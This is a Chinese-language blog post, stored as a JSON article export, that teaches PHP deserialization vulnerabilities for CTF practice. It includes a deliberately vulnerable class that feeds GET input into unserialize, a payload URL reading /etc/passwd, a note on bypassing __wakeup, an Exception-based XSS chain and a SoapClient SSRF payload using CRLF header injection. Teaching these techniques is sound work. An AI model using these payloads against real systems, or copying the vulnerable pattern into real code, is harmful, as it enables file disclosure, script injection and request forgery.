{"title":"PHP-反序列化","uid":"ac5ba92b195ea22428b99b3d70a46fa1","slug":"PHP-反序列化","date":"2025-05-17T08:10:22.090Z","updated":"2025-05-17T08:37:30.224Z","comments":true,"path":"api/articles/PHP-反序列化.json","keywords":null,"cover":"https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/fcb0635d92f79ea826b197540ffc8cbc.jpg","content":"<h1 id=\"PHP-反序列化\"><a href=\"#PHP-反序列化\" class=\"headerlink\" title=\"PHP-反序列化\"></a>PHP-反序列化</h1><p>在 PHP 里，序列化是把一个对象或数组转换成字符串的过程（比如保存到文件或传输到网络），而反序列化就是把这个字符串还原成原来的变量（对象 &#x2F; 数组）。</p>\n<p>用 PHP 的两个函数表示就是：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$ser</span> = <span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$obj</span>);     <span class=\"comment\">// 序列化</span></span><br><span class=\"line\"><span class=\"variable\">$unser</span> = <span class=\"title function_ invoke__\">unserialize</span>(<span class=\"variable\">$ser</span>); <span class=\"comment\">// 反序列化</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/%E5%9B%BE%E7%89%87-15-1024x278.png\"></p>\n<p>为什么反序列化会存在漏洞？</p>\n<p>因为 unserialize() 在反序列化对象时，会自动调用一些类里面的特殊方法，比如：</p>\n<p><a href=\"https://www.bilibili.com/video/BV12om2YTEgW?spm_id_from=333.788.videopod.episodes&vd_source=89bf25153801ebc942aaf90aa2af1675&p=63\">https://www.bilibili.com/video/BV12om2YTEgW?spm_id_from=333.788.videopod.episodes&amp;vd_source=89bf25153801ebc942aaf90aa2af1675&amp;p=63</a></p>\n<ul>\n<li>__wakeup：反序列化时自动调用</li>\n<li>__seleep ()：序列化时自动调用</li>\n<li>__constuct：构造对象时调用</li>\n<li>__destruct()：对象被销毁时自动调用</li>\n<li>__toString()：对象被当成字符串使用时调用</li>\n<li>__call()：调用不存在方法时触发</li>\n<li>__invoke()：对象被当函数调用时触发</li>\n<li>__get ()：访问不存在的成员变量时调用</li>\n<li>__set ()：设置对象不存在的属性或无法访问（私有）的属性时调用</li>\n<li>__isset ()：检查对象的某个属性是否存在会执行此函数，当对不可访问的属性调用 isset () 或 empty () 时，会被自动调用</li>\n<li>__unset ()：在不可访问的某个属性上使用 unset 函数执行，销毁对象的某个不存在属性时自动调用__unset ()</li>\n</ul>\n<p>如果这些方法里面有可以被控制的敏感操作（比如文件读写、命令执行等），就可能被利用形成漏洞</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">student</span></span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$name</span>=<span class=\"string\">&quot;haohao&quot;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$age</span>=<span class=\"number\">19</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$sex</span>= <span class=\"string\">&quot;man&quot;</span>;</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">aaa</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable language_\">$this</span>-&gt;name; </span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">    <span class=\"variable\">$demo</span>=<span class=\"keyword\">new</span> <span class=\"title function_ invoke__\">student</span>();</span><br><span class=\"line\">    <span class=\"variable\">$wocao</span>=<span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$demo</span>);</span><br><span class=\"line\">    <span class=\"keyword\">echo</span> <span class=\"variable\">$wocao</span>;</span><br></pre></td></tr></table></figure>\n<p>使用 serialize 函数进行序列化</p>\n<p><img src=\"https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/%E5%9B%BE%E7%89%87-16.png\"></p>\n<p>unserialize 函数进行反序列化</p>\n<p><img src=\"https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/%E5%9B%BE%E7%89%87-17-1024x33.png\"></p>\n<h2 id=\"反序列化漏洞：\"><a href=\"#反序列化漏洞：\" class=\"headerlink\" title=\"反序列化漏洞：\"></a>反序列化漏洞：</h2><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Cat</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$name</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$file</span>;</span><br><span class=\"line\"> </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__destruct</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">file_get_contents</span>(<span class=\"variable\">$this</span>-&gt;file);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"variable\">$payload</span> = <span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;data&#x27;</span>];</span><br><span class=\"line\"><span class=\"title function_ invoke__\">unserialize</span>(<span class=\"variable\">$payload</span>);</span><br></pre></td></tr></table></figure>\n<p>攻击思路：</p>\n<p>在 ctf 中的解题思路</p>\n<p>1，复制源代码到本地<br>2，注释掉和属性无关的内容<br>3，根据题目需要，给属性赋值<br>4，生成序列化数据，通常要用到 urlencode<br>5，传递数据到服务器</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Cat</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$file</span>=<span class=\"string\">&quot;/etc/passwd&quot;</span>;      <span class=\"comment\">//只留需要的属性,并赋值</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"variable\">$exploit</span> = <span class=\"title function_ invoke__\">serialize</span>(<span class=\"keyword\">new</span> <span class=\"title class_\">Cat</span>());</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"variable\">$exploit</span>;</span><br></pre></td></tr></table></figure>\n<p>将 payload 上传到程序</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://target.com/vuln.php?data=O:3:&quot;Cat&quot;:2:&#123;s:4:&quot;name&quot;;s:3:&quot;nya&quot;;s:4:&quot;file&quot;;s:8:&quot;/etc/passwd&quot;;&#125;  //可使用urlencode编码后再传参</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"wakeup-漏洞：\"><a href=\"#wakeup-漏洞：\" class=\"headerlink\" title=\"__wakeup 漏洞：\"></a>__wakeup 漏洞：</h2><p>漏洞影响范围<br>PHP5 &lt; 5.6.25<br>PHP7 &lt; 7.0.10</p>\n<p>在反序列化一个对象时被自动调用</p>\n<p>在安全编程中，__wakeup() 方法经常用于控制对象的反序列化过程，以避免攻击者能够在反序列化期间执行恶意代码。这是因为反序列化操作本质上是在将一个字符串转换为可执行的代码，因此如果反序列化的对象包含恶意代码，那么它可能会在反序列化过程中执行。</p>\n<p>绕过：当反序列化字符串中，表示属性个数的值⼤于真实属性个数时，会绕过 __wakeup 函数的执⾏。</p>\n<h2 id=\"原生类漏洞利用：\"><a href=\"#原生类漏洞利用：\" class=\"headerlink\" title=\"原生类漏洞利用：\"></a>原生类漏洞利用：</h2><p>php 中内置很多原生的类，在 CTF 中常以 echo new $a ($b); 这种形式出现，当看到这种关键字眼时，就要考虑本题是不是需要原生类利用了。</p>\n<p>下面代码可以查看内置原生类，可对实际情况进行选择性的查看原生类</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"variable\">$classes</span> = <span class=\"title function_ invoke__\">get_declared_classes</span>();</span><br><span class=\"line\"><span class=\"keyword\">foreach</span> (<span class=\"variable\">$classes</span> <span class=\"keyword\">as</span> <span class=\"variable\">$class</span>) &#123;</span><br><span class=\"line\">    <span class=\"variable\">$methods</span> = <span class=\"title function_ invoke__\">get_class_methods</span>(<span class=\"variable\">$class</span>);</span><br><span class=\"line\">    <span class=\"keyword\">foreach</span> (<span class=\"variable\">$methods</span> <span class=\"keyword\">as</span> <span class=\"variable\">$method</span>) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"title function_ invoke__\">in_array</span>(<span class=\"variable\">$method</span>, <span class=\"keyword\">array</span>(</span><br><span class=\"line\">            <span class=\"string\">&#x27;__destruct&#x27;</span>,</span><br><span class=\"line\">            <span class=\"string\">&#x27;__toString&#x27;</span>,</span><br><span class=\"line\">            <span class=\"string\">&#x27;__wakeup&#x27;</span>,</span><br><span class=\"line\">            <span class=\"string\">&#x27;__call&#x27;</span>,</span><br><span class=\"line\">            <span class=\"string\">&#x27;__callStatic&#x27;</span>,</span><br><span class=\"line\">            <span class=\"string\">&#x27;__get&#x27;</span>,</span><br><span class=\"line\">            <span class=\"string\">&#x27;__set&#x27;</span>,</span><br><span class=\"line\">            <span class=\"string\">&#x27;__isset&#x27;</span>,</span><br><span class=\"line\">            <span class=\"string\">&#x27;__unset&#x27;</span>,</span><br><span class=\"line\">            <span class=\"string\">&#x27;__invoke&#x27;</span>,</span><br><span class=\"line\">            <span class=\"string\">&#x27;__set_state&#x27;</span></span><br><span class=\"line\">        ))) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">print</span> <span class=\"variable\">$class</span> . <span class=\"string\">&#x27;::&#x27;</span> . <span class=\"variable\">$method</span> . <span class=\"string\">&quot;\\n&quot;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>输出结果：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"title class_\">Exception</span>::<span class=\"variable constant_\">__wakeup</span></span><br><span class=\"line\"><span class=\"title class_\">Exception</span>::<span class=\"variable constant_\">__toString</span></span><br><span class=\"line\"><span class=\"title class_\">ErrorException</span>::<span class=\"variable constant_\">__wakeup</span></span><br><span class=\"line\"><span class=\"title class_\">ErrorException</span>::<span class=\"variable constant_\">__toString</span></span><br><span class=\"line\"><span class=\"title class_\">Error</span>::<span class=\"variable constant_\">__wakeup</span></span><br><span class=\"line\"><span class=\"title class_\">Error</span>::<span class=\"variable constant_\">__toString</span></span><br><span class=\"line\"><span class=\"title class_\">CompileError</span>::<span class=\"variable constant_\">__wakeup</span></span><br><span class=\"line\"><span class=\"title class_\">CompileError</span>::<span class=\"variable constant_\">__toString</span></span><br><span class=\"line\"><span class=\"title class_\">ParseError</span>::<span class=\"variable constant_\">__wakeup</span></span><br><span class=\"line\"><span class=\"title class_\">ParseError</span>::<span class=\"variable constant_\">__toString</span></span><br><span class=\"line\"><span class=\"title class_\">TypeError</span>::<span class=\"variable constant_\">__wakeup</span></span><br><span class=\"line\"><span class=\"title class_\">TypeError</span>::<span class=\"variable constant_\">__toString</span></span><br><span class=\"line\"><span class=\"title class_\">ArgumentCountError</span>::<span class=\"variable constant_\">__wakeup</span></span><br><span class=\"line\"><span class=\"title class_\">ArgumentCountError</span>::<span class=\"variable constant_\">__toString</span></span><br><span class=\"line\"><span class=\"title class_\">ArithmeticError</span>::<span class=\"variable constant_\">__wakeup</span></span><br><span class=\"line\"><span class=\"title class_\">ArithmeticError</span>::<span class=\"variable constant_\">__toString</span></span><br><span class=\"line\"><span class=\"title class_\">DivisionByZeroError</span>::<span class=\"variable constant_\">__wakeup</span></span><br><span class=\"line\"><span class=\"title class_\">DivisionByZeroError</span>::<span class=\"variable constant_\">__toString</span></span><br><span class=\"line\"><span class=\"title class_\">ClosedGeneratorException</span>::<span class=\"variable constant_\">__wakeup</span></span><br><span class=\"line\"><span class=\"title class_\">ClosedGeneratorException</span>::<span class=\"variable constant_\">__toString</span></span><br><span class=\"line\"><span class=\"title class_\">DateTime</span>::<span class=\"variable constant_\">__wakeup</span></span><br><span class=\"line\">......</span><br></pre></td></tr></table></figure>\n<p>以此道题为例：</p>\n<p><img src=\"https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/%E5%9B%BE%E7%89%87-18.png\"></p>\n<p>给了 flag.php 文件进行提示，访问的 ip 地址必须为 127.0.0.1，且 token 为 ctfshow, 才能拿下 flag</p>\n<p><img src=\"https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/%E5%9B%BE%E7%89%87-19.png\"></p>\n<p>进入页面，只有几行代码，考虑使用原生态利用</p>\n<p>调用了 getFlag () 方法，但 getFlag () 方法不存在</p>\n<p><strong>使用报错类</strong></p>\n<p>Error&#x2F;Exception 触发 XSS</p>\n<p>Error&#x2F;Exception 中有个__toString () 方法，能将我们输入的 xss 内容输出</p>\n<p>POC 链的构造：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"variable\">$a</span> = <span class=\"keyword\">new</span> <span class=\"built_in\">Exception</span>(<span class=\"string\">&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;</span>);</span><br><span class=\"line\"><span class=\"variable\">$b</span> = <span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$a</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">urlencode</span>(<span class=\"variable\">$b</span>);  </span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"><span class=\"comment\">////输出: O%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A25%3A%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A18%3A%22%2Fusercode%2Ffile.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7D</span></span><br></pre></td></tr></table></figure>\n\n<p>使用 SoapClient 构造 SSRF</p>\n<p>(PHP 5, PHP 7, PHP 8)</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span>=</span><br><span class=\"line\"><span class=\"variable\">$ua</span>=<span class=\"string\">&quot;aaa\\r\\nX-Forwarded-For: 127.0.0.1\\r\\nContent-Type:application/x-www-form-urlencoded\\r\\nContent-Length:13\\r\\n\\r\\ntoken=ctfshow&quot;</span>;</span><br><span class=\"line\"><span class=\"variable\">$client</span> = <span class=\"keyword\">new</span> <span class=\"title class_\">SoapClient</span>(<span class=\"literal\">null</span>,<span class=\"keyword\">array</span>(<span class=\"string\">&#x27;url&#x27;</span> =&gt;<span class=\"string\">&#x27;http://127.0.0.1 &#x27;</span>,<span class=\"string\">&#x27;location&#x27;</span>=&gt;<span class=\"string\">&#x27;http://127.0.0.1/flag.php&#x27;</span>,<span class=\"string\">&#x27;user_agent&#x27;</span>=&gt;<span class=\"variable\">$ua</span>);</span><br><span class=\"line\"><span class=\"keyword\">echo</span> <span class=\"title function_ invoke__\">urlencode</span>(<span class=\"title function_ invoke__\">serialize</span>(<span class=\"variable\">$client</span>)); </span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\"><span class=\"comment\">//将编码的数据传参拿下flag.php</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"PHP-字符串逃逸\"><a href=\"#PHP-字符串逃逸\" class=\"headerlink\" title=\"PHP 字符串逃逸\"></a>PHP 字符串逃逸</h2>","text":"PHP-反序列化在 PHP 里，序列化是把一个对象或数组转换成字符串的过程（比如保存到文件或传输到网络），而反序列化就是把这个字符串还原成原来的变量（对象 / ...","permalink":"/post/PHP-反序列化","photos":[],"count_time":{"symbolsCount":"4.7k","symbolsTime":"4 mins."},"categories":[{"name":"PHP安全","slug":"PHP安全","count":1,"path":"api/categories/PHP安全.json"}],"tags":[{"name":"PHP安全","slug":"PHP安全","count":1,"path":"api/tags/PHP安全.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#PHP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96\"><span class=\"toc-text\">PHP-反序列化</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%9A\"><span class=\"toc-text\">反序列化漏洞：</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#wakeup-%E6%BC%8F%E6%B4%9E%EF%BC%9A\"><span class=\"toc-text\">__wakeup 漏洞：</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%8E%9F%E7%94%9F%E7%B1%BB%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%9A\"><span class=\"toc-text\">原生类漏洞利用：</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#PHP-%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8\"><span class=\"toc-text\">PHP 字符串逃逸</span></a></li></ol></li></ol>","author":{"name":"Hao","slug":"blog-author","avatar":"https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/64966b30e1c9375e8dbb11146ea9c12f.jpg","link":"/","description":"山高自有客行路，水深自有渡船认 The future is like the sea and three will be a long time to come","socials":{"github":"https://github.com/isMyHao","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"https://www.zhihu.com/","csdn":"https://blog.csdn.net/2401_87971103?spm=1000.2115.3001.10640","juejin":"","customs":{}}},"mapped":true,"hidden":false,"prev_post":{"title":"APP单项认证","uid":"a9cc9e80be87d52a4207fb04988da523","slug":"APP单项认证","date":"2025-05-17T08:20:25.669Z","updated":"2025-05-17T08:23:39.497Z","comments":true,"path":"api/articles/APP单项认证.json","keywords":null,"cover":"https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/f292f751-55cf-4688-892f-d71c816d8dbe.jpg","text":"APP单项认证单项认证的绕过：没有限制过滤的抓包问题：1、抓不到-工具证书没配置好2、抓不到-app走的不是http/s有限制过滤的抓包问题：3、抓不到-反模拟...","permalink":"/post/APP单项认证","photos":[],"count_time":{"symbolsCount":828,"symbolsTime":"1 mins."},"categories":[{"name":"基础知识","slug":"基础知识","count":12,"path":"api/categories/基础知识.json"}],"tags":[{"name":"基础","slug":"基础","count":12,"path":"api/tags/基础.json"}],"author":{"name":"Hao","slug":"blog-author","avatar":"https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/64966b30e1c9375e8dbb11146ea9c12f.jpg","link":"/","description":"山高自有客行路，水深自有渡船认 The future is like the sea and three will be a long time to come","socials":{"github":"https://github.com/isMyHao","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"https://www.zhihu.com/","csdn":"https://blog.csdn.net/2401_87971103?spm=1000.2115.3001.10640","juejin":"","customs":{}}}},"next_post":{"title":"Js逆向","uid":"38398170e5e634f3f46b2c1de62b6b21","slug":"JS逆向","date":"2025-05-17T07:52:28.669Z","updated":"2025-05-17T08:37:37.449Z","comments":true,"path":"api/articles/JS逆向.json","keywords":null,"cover":"https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/Follow%20me%20for%20more%21%20%23genshin%20%23genshinimpact.jpg","text":"Js逆向JS 分析调试：1，代码的全局搜索 通过数据包找到关键词，并搜索 2，文件流程断点 找到对应数据包 在发起程序中，显示了执行 js 的流程，从下往上执行...","permalink":"/post/JS逆向","photos":[],"count_time":{"symbolsCount":984,"symbolsTime":"1 mins."},"categories":[{"name":"Js安全","slug":"Js安全","count":1,"path":"api/categories/Js安全.json"}],"tags":[{"name":"Js安全","slug":"Js安全","count":1,"path":"api/tags/Js安全.json"}],"author":{"name":"Hao","slug":"blog-author","avatar":"https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/64966b30e1c9375e8dbb11146ea9c12f.jpg","link":"/","description":"山高自有客行路，水深自有渡船认 The future is like the sea and three will be a long time to come","socials":{"github":"https://github.com/isMyHao","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"https://www.zhihu.com/","csdn":"https://blog.csdn.net/2401_87971103?spm=1000.2115.3001.10640","juejin":"","customs":{}}}}}